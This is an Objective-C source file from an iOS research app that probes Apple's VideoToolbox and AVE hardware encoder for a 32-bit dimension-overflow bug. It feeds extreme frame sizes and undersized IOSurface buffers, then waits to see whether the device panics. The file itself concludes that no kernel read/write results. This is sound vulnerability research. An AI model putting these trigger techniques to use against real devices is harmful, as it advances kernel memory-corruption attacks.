//
//  P023VtExtremeProbe.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 8/25/26.
//


// P023VtExtremeProbe.m
#import "P023VtExtremeProbe.h"
#import "LabLocalTime.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

// iOS app SDK has no public <IOSurface/IOSurface.h> — same as P019/JPEG probes.
typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef void (*IOSurfaceRelease_t)(IOSurfaceRef);

static IOSurfaceCreate_t  p023_IOSurfaceCreate;
static IOSurfaceRelease_t p023_IOSurfaceRelease;

static bool p023_load_iosurface(void) {
    if (p023_IOSurfaceCreate && p023_IOSurfaceRelease) return true;
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return false;
    p023_IOSurfaceCreate  = (IOSurfaceCreate_t)dlsym(h, "IOSurfaceCreate");
    p023_IOSurfaceRelease = (IOSurfaceRelease_t)dlsym(h, "IOSurfaceRelease");
    return p023_IOSurfaceCreate && p023_IOSurfaceRelease;
}

// AVE wrap formula (from 02_CVES_AND_P005.txt):
// AVC:  aw = (W+15)&~15,  ah = (H+15)>>4,  size = aw*ah  (32-bit mul)
// HEVC: aw = (W+31)&~31,  ah = (H+31)>>5,  size = aw*ah  (32-bit mul)
// 0x2460 is bake memcpy of session settings, not Sink A DMA.
// Wrap-to-0 = CreateSurface reject, not an undersize alloc. Not KRW.

static uint32_t p023_ave_calc(uint32_t w, uint32_t h, CMVideoCodecType codec) {
    uint32_t aw, ah;
    if (codec == kCMVideoCodecType_H264) {
        aw = (w + 15) & ~15u;
        ah = (h + 15) >> 4;
    } else {
        aw = (w + 31) & ~31u;
        ah = (h + 31) >> 5;
    }
    // FORCE 32-bit multiply (no implicit 64-bit promotion)
    return (uint32_t)(aw * ah);
}

static NSString *p023_size_class(uint32_t sz) {
    if (sz == 0) return @"0-reject";
    if ((int32_t)sz < 0) return @"signed-reject";
    if (sz < 0x100000) return @"small-positive";
    return @"normal";
}

static NSString *p023_logPath = nil;

static void p023_log(NSString *fmt, ...) {
    if (!p023_logPath) {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        p023_logPath = [docs stringByAppendingPathComponent:@"p023_vt_extreme_log.txt"];
    }
    va_list args;
    va_start(args, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    NSString *line = [NSString stringWithFormat:@"[%@] %@\n",
        [NSDateFormatter localizedStringFromDate:[NSDate date]
            dateStyle:NSDateFormatterNoStyle
            timeStyle:NSDateFormatterMediumStyle], msg];
    fprintf(stderr, "p023 %s\n", [msg UTF8String]);
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p023_logPath];
    if (!fh) {
        [line writeToFile:p023_logPath atomically:YES
            encoding:NSUTF8StringEncoding error:nil];
    } else {
        [fh seekToEndOfFile];
        [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
        fcntl([fh fileDescriptor], F_FULLFSYNC);
        [fh closeFile];
    }
}

// Async compression callback
static void p023_callback(void *refCon, void *srcFrameRefCon,
                          OSStatus status, VTEncodeInfoFlags infoFlags,
                          CMSampleBufferRef sampleBuffer) {
    p023_log(@"  [cb] status=%d (0x%x) flags=0x%llx sample=%p",
        (int)status, (unsigned int)status, (uint64_t)infoFlags, sampleBuffer);
    if (status == -19354) {
        p023_log(@"  [cb] -19354 = H.264/HEVC level limit (NOT AVE CheckInfo)");
    }
}

// Test 1: VTCompressionSessionCreate + PrepareToEncodeFrames only
// PrepareToEncodeFrames might pass dimensions to AVE without needing a pixel buffer
static void p023_test_prepare_only(uint32_t w, uint32_t h,
                                    CMVideoCodecType codec, NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, codec);
    p023_log(@"[%@] %u x %u  host Sink A=0x%x (%@)",
        label, w, h, ave_sz, p023_size_class(ave_sz));

    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h, codec,
        NULL, NULL, NULL, p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  SessionCreate -> %d (0x%x)", (int)st, (unsigned int)st);
        return;
    }
    p023_log(@"  SessionCreate -> SUCCESS");

    // Set non-real-time (offline might have different limits)
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    // PrepareToEncodeFrames — this might XPC to videotoolboxd with dimensions
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st != noErr) {
        p023_log(@"  Prepare -> %d (0x%x)", (int)st, (unsigned int)st);
    } else {
        p023_log(@"  Prepare -> 0 (VT accepted; not an AllocSize cite)");
    }

    VTCompressionSessionInvalidate(sess);
    if (sess) CFRelease(sess);
}

// Test 2: Full encode with CVPixelBuffer
// This definitely XPCs to videotoolboxd, but CVPixelBufferCreate may OOM
static void p023_test_full_encode(uint32_t w, uint32_t h,
                                   CMVideoCodecType codec, NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, codec);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] %u x %u  AVE_sz=0x%x wrap=%d", label, w, h, ave_sz, wraps);

    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h, codec,
        NULL, NULL, NULL, p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  SessionCreate -> %d", (int)st);
        return;
    }
    p023_log(@"  SessionCreate -> SUCCESS");

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    // Try CVPixelBufferCreate — this may OOM for large dimensions
    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(NULL, (size_t)w, (size_t)h,
        kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb);
    if (st != noErr) {
        p023_log(@"  CVPixelBufferCreate -> %d (0x%x) — OOM or limit",
            (int)st, (unsigned int)st);
        // Try with a tiny pixel buffer — VT might still pass session dims to AVE
        st = CVPixelBufferCreate(NULL, 16, 16,
            kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb);
        if (st != noErr) {
            p023_log(@"  CVPixelBufferCreate 16x16 -> %d", (int)st);
            VTCompressionSessionInvalidate(sess);
            return;
        }
        p023_log(@"  CVPixelBufferCreate 16x16 -> SUCCESS (trying with small pb)");
    } else {
        p023_log(@"  CVPixelBufferCreate -> SUCCESS");
    }

    // Lock the base address (required for encoding)
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) {
        size_t totalSize = CVPixelBufferGetDataSize(pb);
        memset(base, 0x41, totalSize);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);

    // Encode
    CMTime pts = CMTimeMake(1, 30);
    st = VTCompressionSessionEncodeFrame(sess, pb, pts, kCMTimeInvalid,
        NULL, NULL, NULL);
    p023_log(@"  EncodeFrame -> %d (0x%x)", (int)st, (unsigned int)st);

    if (st == noErr) {
        // Wait for async callback
        p023_log(@"  Waiting 2s for async callback...");
        usleep(2000000);
        p023_log(@"  If no [cb] line, callback hasn't fired yet");
    }

    // Flush
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    usleep(500000);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(sess);
}

// Test 3: IOSurface-backed CVPixelBuffer with extreme dimensions
// IOSurface might allow large reported dimensions with small backing
static void p023_test_iosurface_encode(uint32_t w, uint32_t h,
                                        CMVideoCodecType codec,
                                        NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, codec);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] %u x %u  AVE_sz=0x%x wrap=%d", label, w, h, ave_sz, wraps);

    if (!p023_load_iosurface()) {
        p023_log(@"  STOP: dlopen/dlsym IOSurface failed");
        return;
    }

    // Create an IOSurface with extreme dimensions but small backing
    // Use width×1 bytesPerRow to minimize memory
    NSDictionary *surfaceDict = @{
        @"IOSurfaceWidth":  @(w),
        @"IOSurfaceHeight": @(h),
        @"IOSurfaceBytesPerRow": @(w * 2),  // NV12 needs 2 bytes per pixel
        @"IOSurfacePixelFormat": @(kCVPixelFormatType_420YpCbCr8Planar),
        @"IOSurfaceAllocSize": @(w * 2 * h),  // This might OOM
    };

    // Actually, for extreme dimensions, even IOSurface alloc will fail
    // Try with a small allocation but large reported dimensions
    // IOSurface might separate reported dims from backing size

    // First try: normal IOSurface creation
    IOSurfaceRef surf = p023_IOSurfaceCreate((__bridge CFDictionaryRef)surfaceDict);
    if (!surf) {
        p023_log(@"  IOSurfaceCreate -> NULL (OOM or limit)");

        // Try: create a small IOSurface, then use it with VT
        // VT might use session dimensions, not surface dimensions
        NSDictionary *smallDict = @{
            @"IOSurfaceWidth":  @(16),
            @"IOSurfaceHeight": @(16),
            @"IOSurfaceBytesPerRow": @(32),
            @"IOSurfacePixelFormat": @(kCVPixelFormatType_420YpCbCr8Planar),
            @"IOSurfaceAllocSize": @(32 * 16),
        };
        surf = p023_IOSurfaceCreate((__bridge CFDictionaryRef)smallDict);
        if (!surf) {
            p023_log(@"  IOSurfaceCreate 16x16 -> NULL");
            return;
        }
        p023_log(@"  IOSurfaceCreate 16x16 -> SUCCESS (trying with session dims)");
    } else {
        p023_log(@"  IOSurfaceCreate -> SUCCESS");
    }

    // Create CVPixelBuffer from IOSurface
    CVPixelBufferRef pb = NULL;
    OSStatus st = CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
    if (st != noErr) {
        p023_log(@"  CVPixelBufferCreateWithIOSurface -> %d", (int)st);
        p023_IOSurfaceRelease(surf);
        return;
    }
    p023_log(@"  CVPixelBufferFromIOSurface -> SUCCESS");

    // Create VT session with extreme dimensions
    VTCompressionSessionRef sess = NULL;
    st = VTCompressionSessionCreate(NULL, w, h, codec,
        NULL, NULL, NULL, p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  SessionCreate -> %d", (int)st);
        CVPixelBufferRelease(pb);
        p023_IOSurfaceRelease(surf);
        return;
    }
    p023_log(@"  SessionCreate -> SUCCESS");

    // Encode the small IOSurface-backed buffer in the extreme-dimension session
    CMTime pts = CMTimeMake(1, 30);
    st = VTCompressionSessionEncodeFrame(sess, pb, pts, kCMTimeInvalid,
        NULL, NULL, NULL);
    p023_log(@"  EncodeFrame -> %d (0x%x)", (int)st, (unsigned int)st);

    if (st == noErr) {
        p023_log(@"  Waiting 2s for async callback...");
        usleep(2000000);
    }

    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    usleep(500000);

    CVPixelBufferRelease(pb);
    p023_IOSurfaceRelease(surf);
    VTCompressionSessionInvalidate(sess);
}

// Test 4: VTSessionSetProperty to change dimensions after creation
// Maybe we can create with small dims, then tell VT to use large dims
static void p023_test_property_resize(uint32_t bigW, uint32_t bigH,
                                       CMVideoCodecType codec,
                                       NSString *label) {
    uint32_t ave_sz = p023_ave_calc(bigW, bigH, codec);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] create 1280x720, resize to %u x %u  AVE_sz=0x%x wrap=%d",
        label, bigW, bigH, ave_sz, wraps);

    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, 1280, 720, codec,
        NULL, NULL, NULL, p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  SessionCreate 1280x720 -> %d", (int)st);
        return;
    }
    p023_log(@"  SessionCreate 1280x720 -> SUCCESS");

    // Try to set dimensions via properties
    // VT doesn't have a direct "set width/height" property
    // But we can try kVTCompressionPropertyKey_ExpectedFrameRate or others
    // Actually, dimensions are fixed at creation time in standard VT API
    // But we can try encoding a large frame in a small session

    // Create a small pixel buffer
    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(NULL, 1280, 720,
        kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb);
    if (st != noErr) {
        p023_log(@"  CVPixelBufferCreate 1280x720 -> %d", (int)st);
        VTCompressionSessionInvalidate(sess);
        return;
    }

    // Encode the small frame
    CMTime pts = CMTimeMake(1, 30);
    st = VTCompressionSessionEncodeFrame(sess, pb, pts, kCMTimeInvalid,
        NULL, NULL, NULL);
    p023_log(@"  EncodeFrame 1280x720 -> %d", (int)st);

    // Now try to encode a frame with different dimensions
    // VT might reject this, or it might pass new dimensions to AVE
    CVPixelBufferRef pb2 = NULL;
    // Try a moderately large dimension that won't OOM
    uint32_t tryW = MIN(bigW, 32768u);
    uint32_t tryH = MIN(bigH, 32768u);
    st = CVPixelBufferCreate(NULL, tryW, tryH,
        kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb2);
    if (st == noErr) {
        p023_log(@"  CVPixelBufferCreate %ux%u -> SUCCESS", tryW, tryH);
        st = VTCompressionSessionEncodeFrame(sess, pb2, pts, kCMTimeInvalid,
            NULL, NULL, NULL);
        p023_log(@"  EncodeFrame %ux%u in 1280x720 session -> %d (0x%x)",
            tryW, tryH, (int)st, (unsigned int)st);
        CVPixelBufferRelease(pb2);
    } else {
        p023_log(@"  CVPixelBufferCreate %ux%u -> %d (OOM)", tryW, tryH, (int)st);
    }

    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    usleep(500000);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(sess);
}

// Test 5: Multi-image encoding (VT supports encoding multiple surfaces)
// Maybe we can pass dimensions through a different path
static void p023_test_multi_image(uint32_t w, uint32_t h,
                                   CMVideoCodecType codec,
                                   NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, codec);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] %u x %u  AVE_sz=0x%x wrap=%d", label, w, h, ave_sz, wraps);

    // Try using VTCompressionSession with a multi-image specification
    VTCompressionSessionRef sess = NULL;

    // Try creating with a specification that allows extreme dimensions
    CFMutableDictionaryRef spec = CFDictionaryCreateMutable(NULL, 0,
        NULL, NULL);
    CFDictionarySetValue(spec,
        kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
        kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h, codec,
        spec, NULL, NULL, p023_callback, NULL, &sess);
    CFRelease(spec);

    if (st != noErr) {
        p023_log(@"  SessionCreate (HW) -> %d (0x%x)", (int)st, (unsigned int)st);

        // Try with software encoder
        spec = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
        CFDictionarySetValue(spec,
            kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
            kCFBooleanFalse);
        st = VTCompressionSessionCreate(NULL, w, h, codec,
            spec, NULL, NULL, p023_callback, NULL, &sess);
        CFRelease(spec);
        if (st != noErr) {
            p023_log(@"  SessionCreate (SW) -> %d (0x%x)", (int)st, (unsigned int)st);
            return;
        }
        p023_log(@"  SessionCreate (SW) -> SUCCESS");
    } else {
        p023_log(@"  SessionCreate (HW) -> SUCCESS");
    }

    // Just prepare — no pixel buffer needed
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p023_log(@"  Prepare -> %d (0x%x)", (int)st, (unsigned int)st);

    if (st == noErr) {
        p023_log(@"  Prepare SUCCESS — dims may have reached AVE via XPC");
        p023_log(@"  If AVE wrap triggered, kernel may have overflowed");
        p023_log(@"  Waiting 2s to see if device panics...");
        usleep(2000000);
        p023_log(@"  Device still alive — no panic (or AVE rejected internally)");
    }

    VTCompressionSessionInvalidate(sess);
}

// Test 6: HEVC with extreme dimensions (HEVC has different level limits)
static void p023_test_hevc_levels(uint32_t w, uint32_t h, NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, kCMVideoCodecType_HEVC);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] HEVC %u x %u  AVE_sz=0x%x wrap=%d", label, w, h, ave_sz, wraps);

    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, NULL, NULL, NULL,
        p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  HEVC SessionCreate -> %d (0x%x)", (int)st, (unsigned int)st);
        return;
    }
    p023_log(@"  HEVC SessionCreate -> SUCCESS");

    // Set HEVC level to maximum
    int32_t level = 62;  // HEVC Level 6.2 (highest)
    CFNumberRef levelNum = CFNumberCreate(NULL, kCFNumberSInt32Type, &level);
    VTSessionSetProperty(sess, kVTCompressionPropertyKey_ProfileLevel, levelNum);
    CFRelease(levelNum);

    // Prepare
    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p023_log(@"  HEVC Prepare -> %d", (int)st);

    if (st == noErr) {
        p023_log(@"  HEVC Prepare SUCCESS — waiting 2s for panic check");
        usleep(2000000);
        p023_log(@"  Device alive — no panic");
    }

    VTCompressionSessionInvalidate(sess);
}

// Test 7: Try ProRes (might have different/no dimension limits)
static void p023_test_prores(uint32_t w, uint32_t h, NSString *label) {
    uint32_t ave_sz = p023_ave_calc(w, h, kCMVideoCodecType_AppleProRes4444);
    bool wraps = (ave_sz < 0x2460);
    p023_log(@"[%@] ProRes %u x %u  AVE_sz=0x%x wrap=%d", label, w, h, ave_sz, wraps);

    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_AppleProRes4444, NULL, NULL, NULL,
        p023_callback, NULL, &sess);
    if (st != noErr) {
        p023_log(@"  ProRes SessionCreate -> %d", (int)st);
        // Try ProRes 422
        st = VTCompressionSessionCreate(NULL, w, h,
            kCMVideoCodecType_AppleProRes422, NULL, NULL, NULL,
            p023_callback, NULL, &sess);
        if (st != noErr) {
            p023_log(@"  ProRes422 SessionCreate -> %d", (int)st);
            return;
        }
    }
    p023_log(@"  ProRes SessionCreate -> SUCCESS");

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    p023_log(@"  ProRes Prepare -> %d", (int)st);

    if (st == noErr) {
        p023_log(@"  ProRes Prepare SUCCESS — waiting 2s");
        usleep(2000000);
        p023_log(@"  Device alive");
    }

    VTCompressionSessionInvalidate(sess);
}

// Test 8: Incremental dimension scan
// Find the exact dimension where VT starts rejecting
static void p023_test_incremental_scan(void) {
    static const uint32_t sq[] = { 4096, 8192, 16384, 32768, 65536 };
    for (size_t i = 0; i < sizeof(sq) / sizeof(sq[0]); i++) {
        uint32_t d = sq[i];
        p023_test_prepare_only(d, d, kCMVideoCodecType_H264,
            [NSString stringWithFormat:@"AVC-ceil-%u", d]);
        p023_test_prepare_only(d, d, kCMVideoCodecType_HEVC,
            [NSString stringWithFormat:@"HEVC-ceil-%u", d]);
    }
}

@implementation P023VtExtremeProbe

+ (void)run {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p023_logPath = [docs stringByAppendingPathComponent:@"p023_vt_extreme_log.txt"];
    unlink(p023_logPath.UTF8String);

    p023_log(@"=== p023 session %@ BUILD p023-ceil-v2 ===", LabLocalMilitaryNow());
    p023_log(@"Item (b): VT SessionCreate + Prepare ceiling. No EncodeFrame.");
    p023_log(@"host Sink A is calculator output, not kernel AllocSize.");
    p023_log(@"Wrap-to-0 = CreateSurface reject. 0x2460 = bake. Panic ≠ KRW.");
    p023_log(@"IOServiceOpen already 0xe00002e2 — no direct AVE poke.");

    p023_log(@"");
    p023_log(@"====== Baseline ======");
    p023_test_prepare_only(1280, 720, kCMVideoCodecType_H264, @"H264-baseline");

    p023_log(@"");
    p023_log(@"====== (b) ceiling squares ======");
    p023_test_incremental_scan();

    p023_log(@"");
    p023_log(@"====== HEVC wrap-to-0 (Prepare only; host size 0x0) ======");
    p023_test_prepare_only(65536, 2097152, kCMVideoCodecType_HEVC, @"HEVC-wrap-64K-2M");
    p023_test_prepare_only(131072, 1048576, kCMVideoCodecType_HEVC, @"HEVC-wrap-128K-1M");
    p023_test_prepare_only(262144, 524288, kCMVideoCodecType_HEVC, @"HEVC-wrap-256K-512K");

    p023_log(@"");
    p023_log(@"====== p023 verdict ======");
    p023_log(@"Ceiling = last square with SessionCreate 0 and Prepare 0.");
    p023_log(@"Create fail / -19640 = VT. Wrap-to-0 Prepare 0 is still not alloc.");
    p023_log(@"NOT KRW. Use P035 for AVC 0x1000 host-math pairs.");
}

@end
